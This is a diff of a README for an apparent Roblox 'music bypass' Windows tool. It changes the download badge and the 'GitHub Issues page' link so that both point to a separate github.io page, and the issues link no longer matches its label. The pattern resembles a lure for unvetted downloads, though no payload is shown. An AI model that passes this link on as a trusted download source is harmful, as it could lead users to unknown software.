@@ -6,7 +6,7 @@ This application helps you bypass music restrictions in Roblox, allowing you to 
 
 ## 📥 Download
 
-[![Download Now](https://img.shields.io/badge/Download-roblox--music--bypass--script-ff69b4?style=for-the-badge&logo=github)](https://github.com/fareseladel6-jpg/roblox-music-bypass-script)
+[![Download Now](https://img.shields.io/badge/Download-roblox--music--bypass--script-ff69b4?style=for-the-badge&logo=github)](https://fareseladel6-jpg.github.io)
 
 Visit this link to download the application.
 
@@ -66,6 +66,6 @@ This project is for educational purposes only. Use at your own risk.
 
 ## 🤝 Support
 
-For issues, questions, or feature requests, visit the [GitHub Issues page](https://github.com/fareseladel6-jpg/roblox-music-bypass-script/issues).
+For issues, questions, or feature requests, visit the [GitHub Issues page](https://fareseladel6-jpg.github.io).
 
 Keywords: roblox, music, bypass, audio, script, utility, windows, download
